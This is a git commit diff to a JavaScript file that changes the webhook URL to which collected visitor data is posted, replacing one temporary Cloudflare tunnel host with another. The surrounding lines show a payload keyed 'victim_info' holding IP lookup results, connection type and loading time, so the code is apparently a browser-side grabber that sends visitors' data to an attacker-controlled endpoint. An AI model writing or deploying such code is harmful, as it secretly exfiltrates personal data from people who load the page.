cc0066ad4c1f5f068f1834da8625b33cc0410b96
Elysioxx <108831238+elyelysiox@users.noreply.github.com>
2025-03-20 16:30:27 -0500

    update file

--- script.js
+++ script.js
@@ -85,7 +85,7 @@ Connection Type: ${connectionType}
 Loading Time: ${loadTime}
                 `;
 
-                const webhookURL = "https://indices-elderly-booking-quantum.trycloudflare.com/userData";
+                const webhookURL = "https://memories-anna-sandwich-halloween.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
